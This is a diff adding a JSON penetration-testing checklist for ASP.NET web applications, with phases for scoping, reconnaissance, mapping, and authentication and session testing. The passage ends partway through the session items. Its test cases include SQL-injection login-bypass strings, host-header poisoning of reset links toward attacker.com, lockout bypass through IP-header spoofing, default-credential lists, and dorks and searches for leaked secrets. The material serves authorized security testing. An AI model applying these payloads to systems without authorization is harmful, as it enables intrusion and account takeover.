@@ -1,0 +1,2603 @@
+[
+  {
+    "id": "P0",
+    "name": "Pre-Engagement",
+    "items": [
+      {
+        "id": "PRE-01",
+        "name": "Define Scope & Rules of Engagement",
+        "sev": "info",
+        "how": "Document all in-scope URLs, IP ranges, domains, excluded paths, and test window in a written agreement signed by all parties before any testing begins.",
+        "cases": [
+          "List every in-scope host, URL path, and IP range",
+          "Explicitly list excluded paths: /payment-gateway, live-db, DR systems",
+          "Define testing window: start/end datetime with timezone",
+          "Define emergency stop procedure and escalation contacts",
+          "Document what constitutes out-of-scope (third-party integrations, CDN endpoints)",
+          "Get written authorization signed by asset owner"
+        ],
+        "expected": "Signed scope document with no ambiguity. Out-of-scope paths clearly listed. Written authorization obtained.",
+        "tools": [
+          "Written agreement / contract",
+          "Scope template"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "PRE-02",
+        "name": "Confirm Testing Window & Emergency Contacts",
+        "sev": "info",
+        "how": "Agree on date/time restrictions, blackout periods, and emergency contacts. Document rollback procedures.",
+        "cases": [
+          "Define off-peak testing hours if production environment",
+          "Establish rollback/stop procedure in case of unintended impact",
+          "Identify emergency contacts on client side (name, phone, email)",
+          "Document acceptable source IP addresses for testing",
+          "Confirm whether DoS-style tests (rate limiting, race conditions) are permitted"
+        ],
+        "expected": "Testing schedule agreed. Emergency stop procedure documented. Contact list in place. Source IPs whitelisted.",
+        "tools": [
+          "Email",
+          "Calendar",
+          "Written agreement"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "PRE-03",
+        "name": "Document Target Tech Stack",
+        "sev": "info",
+        "how": "Identify ASP.NET version, .NET CLR, IIS version, SQL Server, frontend frameworks, CDN, WAF prior to active testing.",
+        "cases": [
+          "Check response headers for X-AspNet-Version, X-Powered-By in any response",
+          "Run: whatweb https://target.com",
+          "Use Wappalyzer browser extension while browsing the target",
+          "Note: .NET version, IIS version, JavaScript frameworks, database indicators",
+          "Identify WAF/CDN: Cloudflare, Akamai, AWS CloudFront (affects testing approach)",
+          "Note API style: REST, GraphQL, OData, SOAP/WSDL"
+        ],
+        "expected": "Tech stack inventory completed: OS, web server+version, framework+version, database, CDN, WAF. Payloads can now be targeted.",
+        "tools": [
+          "Wappalyzer",
+          "BuiltWith",
+          "whatweb",
+          "Burp response headers",
+          "nmap -sV"
+        ],
+        "cwe": [],
+        "mitre": [
+          "TA0043"
+        ]
+      },
+      {
+        "id": "PRE-04",
+        "name": "Configure Burp Suite & OWASP ZAP",
+        "sev": "info",
+        "how": "Set up both Burp Suite and ZAP as proxies. Install CA certificates. Configure target scope.",
+        "cases": [
+          "Burp: Proxy → Listeners → 127.0.0.1:8080 | Import Burp CA cert into Firefox",
+          "ZAP: Listen on 127.0.0.1:8081 | Import ZAP root CA",
+          "Set Burp target scope to target domain to filter noise",
+          "Enable Burp passive scan in background while browsing",
+          "ZAP: Configure Ajax Spider for React/Angular/Vue SPAs",
+          "Test intercept: visit https://target.com → confirm request captured in both tools"
+        ],
+        "expected": "All browser HTTPS traffic intercepted without SSL errors. Passive scan running in background.",
+        "tools": [
+          "Burp Suite Community Edition",
+          "OWASP ZAP",
+          "Firefox"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "PRE-05",
+        "name": "Create Project Folder Structure & Test Accounts",
+        "sev": "info",
+        "how": "Set up organised directories for evidence. Obtain or create test accounts for each role type.",
+        "cases": [
+          "mkdir -p project/{recon,scans,screenshots,findings,reports}",
+          "Document all tool versions used in a README.txt",
+          "Obtain: unauthenticated access (no account needed)",
+          "Obtain: low-privilege user account (test1@target.com)",
+          "Obtain: admin/privileged account (if in scope)",
+          "Obtain: API keys/tokens for API testing",
+          "Confirm test accounts are isolated from real user data"
+        ],
+        "expected": "Folder structure in place. Test accounts for each role available and documented securely.",
+        "tools": [
+          "bash",
+          "Password manager"
+        ],
+        "cwe": [],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P1",
+    "name": "Reconnaissance",
+    "items": [
+      {
+        "id": "WSTG-INFO-01",
+        "name": "Search Engine Discovery (Google Dorking)",
+        "sev": "medium",
+        "how": "Use advanced search operators to find exposed files, login pages, error messages, and config files indexed by search engines.",
+        "cases": [
+          "site:target.com filetype:pdf — exposed documents",
+          "site:target.com inurl:admin OR inurl:administrator — admin pages",
+          "site:target.com \"error\" OR \"exception\" OR \"stack trace\" — verbose errors",
+          "site:target.com ext:config OR ext:bak OR ext:sql OR ext:old — config/backups",
+          "site:target.com inurl:api OR inurl:swagger OR inurl:api-docs — API endpoints",
+          "intext:\"target.com\" filetype:xls OR filetype:xlsx — data exports",
+          "site:target.com inurl:login OR inurl:signin — login pages",
+          "intitle:\"index of\" site:target.com — directory listings"
+        ],
+        "expected": "No sensitive files, admin interfaces, credentials, or verbose errors indexed by search engines.",
+        "tools": [
+          "Google",
+          "Bing",
+          "ghdb.exploit-db.com",
+          "DorkSearch.com"
+        ],
+        "cwe": [],
+        "mitre": [
+          "TA0043"
+        ]
+      },
+      {
+        "id": "WSTG-INFO-02",
+        "name": "Fingerprint Web Server",
+        "sev": "medium",
+        "how": "Analyze HTTP response headers, error pages, and timing to identify web server software and version.",
+        "cases": [
+          "Send GET / via Burp Repeater → inspect all response headers",
+          "Look for: Server: Microsoft-IIS/10.0 (version disclosure)",
+          "Look for: X-Powered-By: ASP.NET, X-AspNet-Version: 4.0.30319",
+          "Trigger 404 → check default error page format (IIS vs nginx vs Apache)",
+          "Send invalid HTTP verb → check error response format",
+          "ETag header format differs between web servers",
+          "nmap -sV -p 443 target.com — OS/service fingerprint"
+        ],
+        "expected": "Server headers must NOT reveal version numbers. X-AspNet-Version and X-Powered-By absent from all responses.",
+        "tools": [
+          "Burp Suite Repeater",
+          "curl -I https://target.com",
+          "Wappalyzer",
+          "nmap -sV"
+        ],
+        "cwe": [],
+        "mitre": [
+          "TA0043"
+        ]
+      },
+      {
+        "id": "WSTG-INFO-03",
+        "name": "Review Webserver Metafiles",
+        "sev": "low",
+        "how": "Request robots.txt, sitemap.xml, and .well-known resources to enumerate paths and application structure.",
+        "cases": [
+          "GET /robots.txt — note ALL Disallow entries (potential high-value targets)",
+          "GET /sitemap.xml — enumerate all mapped URLs",
+          "GET /sitemap_index.xml — index of multiple sitemaps",
+          "GET /.well-known/security.txt — contact info and policy disclosure",
+          "GET /.well-known/openid-configuration — OIDC endpoint discovery",
+          "GET /crossdomain.xml — Flash cross-domain policy",
+          "GET /clientaccesspolicy.xml — Silverlight policy"
+        ],
+        "expected": "robots.txt does not reveal sensitive internal paths. Sitemap covers only public content.",
+        "tools": [
+          "Browser",
+          "Burp Repeater",
+          "curl"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-INFO-04",
+        "name": "Enumerate Applications on Webserver",
+        "sev": "medium",
+        "how": "Discover all web applications on the same server using port scanning, virtual hosting, and subdomain enumeration.",
+        "cases": [
+          "nmap -sV -p 80,443,8080,8443,8000,8888,9090,3000,4443 target.com",
+          "Test virtual host routing: modify Host header to known subdomains",
+          "Test: dev., staging., test., uat., api., admin., portal. subdomains",
+          "gobuster vhost -u https://target.com -w subdomains.txt",
+          "Check for apps on non-standard ports",
+          "Test HTTP/2 vs HTTP/1.1 responses for differences"
+        ],
+        "expected": "All applications on server catalogued. Unexpected apps on non-standard ports is a finding.",
+        "tools": [
+          "nmap",
+          "gobuster vhost",
+          "ffuf -H \"Host: FUZZ.target.com\""
+        ],
+        "cwe": [],
+        "mitre": [
+          "TA0043"
+        ]
+      },
+      {
+        "id": "WSTG-INFO-05",
+        "name": "Webpage Content Information Leakage",
+        "sev": "medium",
+        "how": "Review HTML source, JavaScript files, and comments for credentials, API keys, internal paths, and developer notes.",
+        "cases": [
+          "View-source on EVERY page: Ctrl+U → search: password, apikey, secret, token, TODO, FIXME, debug, internal",
+          "Open DevTools → Sources → review ALL .js files for hardcoded secrets",
+          "Search .js: Authorization, Bearer, Basic, api_key, private_key, connectionString, AWS_ACCESS",
+          "Check HTML meta tags for: generator, internal URLs, build IDs",
+          "Check for email addresses in source (staff enumeration for phishing awareness)",
+          "Check data- HTML attributes for sensitive values",
+          "Search for internal domains: .internal, .corp, .local, 192.168., 10.0."
+        ],
+        "expected": "No credentials, API keys, tokens, or sensitive internal information in client-side code.",
+        "tools": [
+          "Browser DevTools",
+          "Burp → filter .js",
+          "LinkFinder",
+          "grep / ripgrep"
+        ],
+        "cwe": [
+          "CWE-200"
+        ],
+        "mitre": [
+          "T1552"
+        ]
+      },
+      {
+        "id": "INFO-01",
+        "name": "WHOIS, DNS & Passive Reconnaissance",
+        "sev": "low",
+        "how": "Run WHOIS and DNS enumeration to find org contacts, subdomains, and attempt zone transfer. Search Shodan/Censys/Wayback.",
+        "cases": [
+          "whois target.com — registrar, org, email contacts",
+          "dig target.com ANY — all DNS records",
+          "dig axfr @ns1.target.com target.com — zone transfer (should return REFUSED)",
+          "dnsenum target.com — automated DNS enum",
+          "crt.sh: https://crt.sh/?q=%.target.com — subdomain discovery via cert transparency",
+          "Shodan.io: search target IP — open ports, banners, SSL certs",
+          "archive.org/web — old pages, removed endpoints, legacy parameters",
+          "LinkedIn / job postings — tech stack, internal tool names",
+          "Hunter.io — employee email patterns for phishing awareness"
+        ],
+        "expected": "Zone transfer disabled. No internal hostnames disclosed via DNS. SPF/DKIM/DMARC properly configured.",
+        "tools": [
+          "whois",
+          "dig",
+          "dnsenum",
+          "crt.sh",
+          "shodan.io",
+          "archive.org"
+        ],
+        "cwe": [],
+        "mitre": [
+          "TA0043"
+        ]
+      },
+      {
+        "id": "INFO-02",
+        "name": "Port Scanning & Service Detection",
+        "sev": "medium",
+        "how": "Run full TCP port scan with service and version detection to discover all open services.",
+        "cases": [
+          "nmap -sV -sC -p- --open target.com -oA scan_output (full scan)",
+          "nmap -sV -p 80,443,8080,8443,8000,9090,3389,22,21,25,3306,1433,5432 target.com (quick)",
+          "Check for management ports: 3389 (RDP), 22 (SSH), 8080/8443 (admin), 21 (FTP)",
+          "masscan -p1-65535 target.com --rate=1000 (fast large-range)",
+          "Identify plaintext services: FTP, Telnet, HTTP (not HTTPS), SMTP without STARTTLS",
+          "Banner grab: nc -v target.com PORT"
+        ],
+        "expected": "Only necessary ports open externally. Management ports restricted to VPN/internal only. No plaintext services.",
+        "tools": [
+          "nmap",
+          "masscan",
+          "Shodan"
+        ],
+        "cwe": [
+          "CWE-668"
+        ],
+        "mitre": [
+          "TA0043"
+        ]
+      },
+      {
+        "id": "INFO-03",
+        "name": "Directory & File Brute-Force",
+        "sev": "high",
+        "how": "Use wordlists to discover hidden directories, backup files, admin pages, and .NET-specific sensitive paths.",
+        "cases": [
+          "gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x aspx,ashx,asmx,config,bak,old,log,txt,json",
+          "Look for: /admin, /administrator, /manage, /backup, /api, /.git, /web.config, /appsettings.json",
+          ".NET specific: /App_Data/, /App_Code/, /elmah.axd, /trace.axd, /ScriptResource.axd, /WebResource.axd",
+          "Try: web.config.bak, appsettings.json.old, web.config~, appsettings.Development.json",
+          "ffuf -w wordlist.txt -u https://target/FUZZ -mc 200,301,302,403",
+          "feroxbuster -u https://target.com -x aspx,ashx --depth 3",
+          "Check response 403 pages — they confirm existence even if access denied"
+        ],
+        "expected": "No backup files, git repos, admin interfaces, or sensitive config files web-accessible.",
+        "tools": [
+          "gobuster",
+          "feroxbuster",
+          "ffuf",
+          "OWASP ZAP Forced Browse"
+        ],
+        "cwe": [
+          "CWE-538"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "INFO-04",
+        "name": "GitHub / Source Code Leakage",
+        "sev": "critical",
+        "how": "Search GitHub, GitLab, and other repositories for leaked credentials, API keys, config files.",
+        "cases": [
+          "GitHub: org:companyname password OR secret OR api_key OR apikey",
+          "GitHub: filename:.env target.com",
+          "GitHub: filename:web.config connectionstring",
+          "GitHub: filename:appsettings.json company OR target",
+          "GitLeaks: gitleaks detect on any found repos",
+          "truffleHog on repositories: trufflehog git https://github.com/target/repo",
+          "Search: \"target.com\" in:file language:yaml (CI/CD config secrets)",
+          "Search: \"smtp.target.com\" OR \"db.target.com\" in GitHub code"
+        ],
+        "expected": "No credentials, API keys, connection strings, or internal config leaked in public repositories.",
+        "tools": [
+          "GitHub advanced search",
+          "gitleaks",
+          "truffleHog",
+          "gitrob"
+        ],
+        "cwe": [
+          "CWE-200"
+        ],
+        "mitre": [
+          "T1552"
+        ]
+      },
+      {
+        "id": "INFO-05",
+        "name": "Subdomain Takeover",
+        "sev": "high",
+        "how": "Check DNS CNAME records for entries pointing to unclaimed cloud services (Azure, AWS, GitHub Pages, Heroku).",
+        "cases": [
+          "subfinder -d target.com -o subs.txt — enumerate subdomains",
+          "amass enum -d target.com — comprehensive subdomain enum",
+          "For each subdomain: dig CNAME sub.target.com — what does it point to?",
+          "Look for: NXDOMAIN responses on CNAME targets = potential takeover",
+          "Check unclaimed Azure: .azurewebsites.net | GitHub: .github.io | Heroku: .herokuapp.com",
+          "subjack -w subs.txt -t 100 -timeout 30 -o results.txt",
+          "can-i-take-over-xyz for automated fingerprinting"
+        ],
+        "expected": "All subdomains resolve to active owned resources. No dangling DNS CNAME entries pointing to unclaimed services.",
+        "tools": [
+          "subfinder",
+          "amass",
+          "subjack",
+          "dig",
+          "can-i-take-over-xyz"
+        ],
+        "cwe": [
+          "CWE-284"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "INFO-06",
+        "name": "Parameter Discovery",
+        "sev": "medium",
+        "how": "Discover hidden or undocumented GET/POST parameters on known endpoints.",
+        "cases": [
+          "arjun -u https://target.com/page --get — discover hidden GET params",
+          "arjun -u https://target.com/api/endpoint --post — POST params",
+          "Burp Param Miner: right-click request → Guess params (Community: manual)",
+          "Test common hidden params: debug, test, admin, id, user, token, redirect, returnUrl, callback",
+          "Test .NET-specific: __VIEWSTATE, __EVENTVALIDATION, __RequestVerificationToken, __EVENTTARGET",
+          "Try adding: ?_method=DELETE, ?format=json, ?callback=test (JSONP)"
+        ],
+        "expected": "All parameters documented. No hidden debug/admin parameters in production.",
+        "tools": [
+          "arjun",
+          "Burp Param Miner",
+          "Manual"
+        ],
+        "cwe": [],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P2",
+    "name": "App Mapping",
+    "items": [
+      {
+        "id": "MAP-01",
+        "name": "Spider / Crawl Application",
+        "sev": "medium",
+        "how": "Crawl the entire application using Burp and ZAP. Use Ajax Spider for JS-heavy SPAs. Browse as all user roles.",
+        "cases": [
+          "Burp: right-click host → Spider this host / Discover Content",
+          "ZAP → Analyse → Spider (traditional) | Ajax Spider (React/Angular/Vue SPA)",
+          "Browse as: unauthenticated, low-privilege user, admin (capture all role-specific functionality)",
+          "Map all multi-step flows: registration, checkout, password reset, MFA enrollment",
+          "DevTools Network tab: catch requests not proxied through Burp",
+          "Document: all forms, their method (GET/POST) and action URLs"
+        ],
+        "expected": "Complete sitemap in Burp. All forms, API endpoints, and entry points catalogued by role.",
+        "tools": [
+          "Burp Suite",
+          "OWASP ZAP",
+          "Browser DevTools"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "MAP-02",
+        "name": "Map All Entry Points",
+        "sev": "medium",
+        "how": "Systematically identify every location where user-controlled input enters the application.",
+        "cases": [
+          "GET/POST URL parameters: ?id=1, ?search=test",
+          "URL path segments (REST): /api/users/{id}/profile",
+          "HTTP headers: Cookie, Referer, User-Agent, X-Forwarded-For, X-Forwarded-Host, custom headers",
+          "JSON/XML body parameters",
+          "File upload endpoints (filename, content, metadata)",
+          "WebSocket messages (if present)",
+          "Hidden HTML form fields",
+          "GraphQL query parameters, mutation inputs, variables"
+        ],
+        "expected": "Complete entry point inventory. Every entry point is a potential injection or access control vector.",
+        "tools": [
+          "Burp Suite Site Map",
+          "OWASP ZAP Spider"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "MAP-03",
+        "name": "JavaScript File Analysis",
+        "sev": "high",
+        "how": "Review all JavaScript files for hardcoded credentials, hidden API endpoints, internal paths, and sensitive logic.",
+        "cases": [
+          "Burp → Target → Site Map → filter .js files → review each file",
+          "LinkFinder: python linkfinder.py -i https://target.com/app.js -o cli",
+          "Search JS for: apiKey, api_key, password, secret, Bearer, Authorization, /api/, connectionString",
+          "Check for .js.map source maps — may expose original pre-compiled TypeScript/source",
+          "Check React/Vue/Angular bundles: credentials in .env not excluded from build?",
+          "Search for hardcoded internal URLs: .internal, .corp, 192.168., 10.0.",
+          "Check localStorage.setItem() calls for sensitive token storage"
+        ],
+        "expected": "No credentials or API keys in JavaScript. No hidden admin API endpoints client-side. No source map exposure.",
+        "tools": [
+          "Browser DevTools Sources",
+          "Burp filter .js",
+          "LinkFinder"
+        ],
+        "cwe": [
+          "CWE-200"
+        ],
+        "mitre": [
+          "T1552"
+        ]
+      },
+      {
+        "id": "MAP-04",
+        "name": "ViewState Analysis (ASP.NET WebForms)",
+        "sev": "high",
+        "how": "Check ViewState presence, MAC protection, and sensitive data disclosure.",
+        "cases": [
+          "Find __VIEWSTATE hidden field in page HTML source",
+          "Burp Decoder → Base64 decode __VIEWSTATE value → inspect content",
+          "Check if sensitive user data appears in decoded ViewState",
+          "Tamper a byte in ViewState → resubmit → should cause MAC error (good = protected)",
+          "Silent acceptance of tampered ViewState = MAC disabled = critical finding",
+          "Check web.config for: enableViewStateMac=\"false\" or viewStateEncryptionMode",
+          "Also check: __EVENTVALIDATION field — should also be MAC protected"
+        ],
+        "expected": "ViewState MAC-protected. Tampering causes validation error. No sensitive data in plaintext ViewState.",
+        "tools": [
+          "Burp Decoder",
+          "ViewStateDecoder online",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-642"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "MAP-05",
+        "name": "API Endpoint Discovery",
+        "sev": "medium",
+        "how": "Discover API documentation, all endpoints, versioning, and authentication requirements.",
+        "cases": [
+          "Browse to: /swagger, /swagger/index.html, /swagger/ui/index, /api-docs, /openapi.json, /v2/api-docs",
+          "Check JS files for /api/ endpoint references",
+          "Test API versions: /api/v1/ vs /api/v2/ vs /api/v3/ (older versions may have weaker auth)",
+          "Check .NET OData: /api/$metadata (exposes full data schema)",
+          "OPTIONS request on /api/ routes — lists allowed methods and CORS headers",
+          "GraphQL: /graphql, /api/graphql, /v1/graphql"
+        ],
+        "expected": "API documentation not publicly accessible in production. All API endpoints require authentication. Old versions deprecated.",
+        "tools": [
+          "Browser",
+          "gobuster",
+          "Burp",
+          "Postman"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "MAP-06",
+        "name": "WebSocket Discovery & Analysis",
+        "sev": "medium",
+        "how": "Identify and analyze WebSocket connections for auth, authorization, and injection issues.",
+        "cases": [
+          "Browser DevTools → Network → WS tab → capture all WebSocket messages",
+          "Burp → WebSockets history → review all message frames",
+          "Does WebSocket connection include auth token in upgrade request? (Sec-WebSocket-Protocol?)",
+          "Test: modify WebSocket upgrade request → access other users data?",
+          "Inject XSS/SQLi payloads in WebSocket message fields",
+          "Replay captured WebSocket messages in Burp → are they server-validated?",
+          "Test: connect without auth token — server should reject"
+        ],
+        "expected": "WebSocket connections require authentication. All messages validated server-side. No injection possible via WS messages.",
+        "tools": [
+          "Burp Suite WebSockets",
+          "Browser DevTools",
+          "wscat"
+        ],
+        "cwe": [
+          "CWE-287"
+        ],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P3",
+    "name": "Authentication Testing",
+    "items": [
+      {
+        "id": "WSTG-ATHN-01",
+        "name": "Credentials Over Encrypted Channel",
+        "sev": "critical",
+        "how": "Verify all credential submissions are made exclusively over HTTPS, never over HTTP.",
+        "cases": [
+          "Open login page on HTTP — does it force redirect to HTTPS before form renders?",
+          "Check form ACTION attribute: points to https:// URL?",
+          "Intercept login POST in Burp — TLS-encrypted connection used?",
+          "Check password reset form submission — HTTPS only?",
+          "Test API auth endpoints over HTTP — rejected?",
+          "HSTS header on login domain: Strict-Transport-Security present and correct?",
+          "Check all API endpoints: Bearer token sent over HTTP anywhere?"
+        ],
+        "expected": "All credential submissions over HTTPS only. HTTP redirects before form action. HSTS present with max-age >= 31536000.",
+        "tools": [
+          "Burp Suite",
+          "Browser address bar",
+          "curl"
+        ],
+        "cwe": [
+          "CWE-319"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-ATHN-02",
+        "name": "Default Credentials Testing",
+        "sev": "critical",
+        "how": "Test all login and management interfaces for commonly known default credentials.",
+        "cases": [
+          "Try: admin/admin, admin/password, admin/123456, admin/[blank], admin/admin123",
+          "Try: administrator/administrator, sa/sa (MSSQL), test/test, guest/guest",
+          "Check management portals if accessible: IIS Manager, MSSQL SA, phpMyAdmin",
+          "Shodan: check if target services have known default creds",
+          "Check system-generated accounts (installer accounts, service accounts)",
+          "Try: company name as both username and password",
+          "Try first name / last name combinations from LinkedIn staff enumeration"
+        ],
+        "expected": "No default credentials accepted on any login interface. All accounts have unique strong passwords.",
+        "tools": [
+          "Burp Intruder",
+          "Hydra",
+          "SecLists default credentials list"
+        ],
+        "cwe": [
+          "CWE-1392"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "WSTG-ATHN-03",
+        "name": "Account Lockout & Rate Limiting",
+        "sev": "high",
+        "how": "Test whether the application enforces account lockout or rate limiting after repeated failed attempts.",
+        "cases": [
+          "Submit 10+ failed login attempts for same account — lockout or rate limit?",
+          "Test lockout bypass: X-Forwarded-For: 1.2.3.4 → 1.2.3.5 → 1.2.3.6 header rotation",
+          "Test lockout bypass: X-Real-IP, X-Originating-IP, CF-Connecting-IP header spoofing",
+          "Distribute attempts over time (1 per minute) — lockout still applies?",
+          "Test: does lockout apply to password reset too?",
+          "Test: does lockout apply to OTP/MFA entry page?",
+          "Check lockout duration — too short (30 seconds) = ineffective"
+        ],
+        "expected": "Lockout after 5-10 failed attempts OR rate limiting enforced. Lockout cannot be bypassed via IP header spoofing.",
+        "tools": [
+          "Burp Intruder",
+          "Hydra",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-307"
+        ],
+        "mitre": [
+          "T1110"
+        ]
+      },
+      {
+        "id": "WSTG-ATHN-04",
+        "name": "Authentication Bypass",
+        "sev": "critical",
+        "how": "Attempt to bypass the authentication mechanism using SQL injection, forced browsing, and response manipulation.",
+        "cases": [
+          "SQL injection in login: admin'-- in username field",
+          "' OR '1'='1' -- in password field with any username",
+          "Navigate directly to /dashboard, /admin, /profile without any session",
+          "Intercept login 302 redirect: change response to 200 OK → does page render?",
+          "Add URL params: ?debug=true, ?admin=1, ?authenticated=true, ?bypass=1",
+          "Test login with empty username AND empty password",
+          "SAML response manipulation if SSO used: change NameID or role attribute",
+          "Try null bytes: username=admin%00' in login fields"
+        ],
+        "expected": "No authentication bypass possible. Direct URL access to authenticated pages redirects to login.",
+        "tools": [
+          "Burp Suite Repeater",
+          "sqlmap",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-287"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "WSTG-ATHN-07",
+        "name": "Password Policy Testing",
+        "sev": "medium",
+        "how": "Test password policy enforcement at registration, password change, and password reset.",
+        "cases": [
+          "Register with: a (1 char — too short)",
+          "Register with: 12345678 (numeric only)",
+          "Register with: password (dictionary word)",
+          "Register with: aaaaaaaa (all same character)",
+          "Register with: Password1 (minimal complexity — should fail if policy strong)",
+          "Check minimum length enforced (should be >= 12 chars)",
+          "Check if common/breached passwords rejected: haveibeenpwned API integration?",
+          "Test if username cannot be used as password",
+          "Test same policy on: registration + password change + password reset forms"
+        ],
+        "expected": "Minimum 12 characters with complexity (upper, lower, digit, symbol). Common/breached passwords rejected.",
+        "tools": [
+          "Browser",
+          "Burp Repeater"
+        ],
+        "cwe": [
+          "CWE-521"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-ATHN-09",
+        "name": "Password Reset Functionality",
+        "sev": "high",
+        "how": "Test the password reset flow for token security, expiry, reuse, enumeration, and host header injection.",
+        "cases": [
+          "Request reset → analyze email token: length, character set, entropy",
+          "Request 2 resets in sequence — are tokens sequential or predictable?",
+          "Test token expiry: use a 2-hour-old token → must fail",
+          "Test single-use: consume token, then use it again → must fail",
+          "Host header injection: change Host: attacker.com → check if reset link uses attacker domain",
+          "Test: X-Forwarded-Host: attacker.com same as above",
+          "Email enumeration: does \"email sent\" confirm account exists?",
+          "Reset link still valid after victim changes password? (Should be invalidated)",
+          "Security question bypass if used: try common answers, SQL injection in answer field"
+        ],
+        "expected": "Tokens are random (>=128 bits entropy), single-use, expire <=30 min. Host header not reflected in reset emails.",
+        "tools": [
+          "Burp Repeater",
+          "Email client"
+        ],
+        "cwe": [
+          "CWE-640"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "WSTG-ATHN-11",
+        "name": "Multi-Factor Authentication (MFA) Testing",
+        "sev": "high",
+        "how": "Test MFA implementation for bypass, OTP brute force, code reuse, and step-skipping.",
+        "cases": [
+          "After login step 1: navigate directly to post-MFA URL — works without MFA?",
+          "Try submitting expired OTP codes (>30 seconds old)",
+          "OTP brute force on MFA page: does rate limiting / lockout apply? (000000→999999)",
+          "Submit empty OTP code — does server accept it?",
+          "Can MFA be disabled without re-authentication?",
+          "Backup codes: are they single-use? Sufficient entropy (>=8 chars)?",
+          "TOTP time window: does server accept codes from 5+ minutes ago?",
+          "Test account recovery: can recovery bypass MFA entirely?"
+        ],
+        "expected": "MFA cannot be skipped. OTPs expire after 30s. Brute force protection on OTP page. Recovery flow also requires strong verification.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-308"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "WSTG-IDNT-04",
+        "name": "Account Enumeration",
+        "sev": "medium",
+        "how": "Test login, registration, and password reset flows for differences revealing valid account existence.",
+        "cases": [
+          "Login: compare exact error text for valid vs invalid username",
+          "Login: measure response TIME for valid vs invalid username (timing oracle)",
+          "Password reset: does it confirm \"email sent\" only for valid emails?",
+          "Registration: does it say \"email already registered\" vs \"registered successfully\"?",
+          "Burp Intruder: send username list → compare response sizes/codes",
+          "API: test /api/users/check-email or /api/register endpoint",
+          "API: test /users/{username} — does 404 vs 403 reveal existence?"
+        ],
+        "expected": "Identical generic responses and response times for valid/invalid accounts. No account enumeration possible.",
+        "tools": [
+          "Burp Intruder",
+          "Manual comparison"
+        ],
+        "cwe": [
+          "CWE-204"
+        ],
+        "mitre": [
+          "T1589"
+        ]
+      },
+      {
+        "id": "WSTG-SESS-01",
+        "name": "Session Token Analysis",
+        "sev": "high",
+        "how": "Analyze session token randomness, encoding, predictability, and information disclosure.",
+        "cases": [
+          "Collect 10+ session tokens by logging in/out repeatedly",
+          "Burp → Sequencer → load tokens → run full analysis → check FIPS pass/fail",
+          "Decode tokens: is it Base64? JWT? Custom encoding? Timestamp-based?",
+          "Does token contain user ID, role, or timestamp in plaintext?",
+          "Token length: should be >= 128 bits (32 hex chars minimum)",
+          "Change one character in token → does session remain valid? (It should not)",
+          "ASP.NET_SessionId: 24-char Base64 = 128-bit random? Run through Sequencer"
+        ],
+        "expected": "Tokens pass Burp Sequencer FIPS analysis. No predictable pattern. No user data embedded. >=128 bits entropy.",
+        "tools": [
+          "Burp Sequencer",
+          "jwt.io",
+          "Burp Decoder"
+        ],
+        "cwe": [
+          "CWE-330"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-SESS-02",
+        "name": "Cookie Security Attributes",
+        "sev": "high",
+        "how": "Inspect all session and auth cookies for Secure, HttpOnly, SameSite, Domain, and Path attributes.",
+        "cases": [
+          "Browser DevTools → Application → Cookies → inspect EVERY cookie",
+          "Burp: check all Set-Cookie response headers during browsing",
+          "Missing Secure flag: session cookie transmittable over HTTP → session hijacking",
+          "Missing HttpOnly: JavaScript can read cookie → XSS leads to session theft",
+          "SameSite=None without Secure: CSRF risk",
+          "SameSite not set: defaults to browser behavior (risky on older browsers)",
+          "Domain attribute too broad: .target.com allows all subdomains → subdomain XSS risk",
+          ".NET: check ASP.NET_SessionId, .ASPXAUTH, .ASPXROLES, __RequestVerificationToken"
+        ],
+        "expected": "All session cookies: Secure=true, HttpOnly=true, SameSite=Strict or Lax. Minimal Domain/Path scope.",
+        "tools": [
+          "Browser DevTools",
+          "Burp Suite"
+        ],
+        "cwe": [
+          "CWE-614",
+          "CWE-1004"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-SESS-03",
+        "name": "Session Fixation",
+        "sev": "high",
+        "how": "Test if the application regenerates the session token after successful authentication.",
+        "cases": [
+          "Capture session token BEFORE login (unauthenticated request gets cookie)",
+          "Complete the login process",
+          "Compare session cookie value BEFORE and AFTER login — must be DIFFERENT",
+          "If same token used before and after login = session fixation vulnerability",
+          "Test: manually set a custom session cookie value before login → accepted post-auth?",
+          "Test: does token change after MFA completion (second auth step)?",
+          "Test: does token change after privilege change (e.g. user becomes admin)?"
+        ],
+        "expected": "Session token regenerated on authentication. Pre-auth token invalidated after successful login.",
+        "tools": [
+          "Burp Suite",
+          "Browser DevTools"
+        ],
+        "cwe": [
+          "CWE-384"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-SESS-06",
+        "name": "Logout & Session Invalidation",
+        "sev": "medium",
+        "how": "Test that logout invalidates the server-side session and that old tokens cannot be reused.",
+        "cases": [
+          "Log in → copy session cookie → log out → replay old cookie in Burp Repeater",
+          "Old cookie must return 401 or redirect to login, NOT serve authenticated content",
+          "Test logout from all devices/sessions option (if available)",
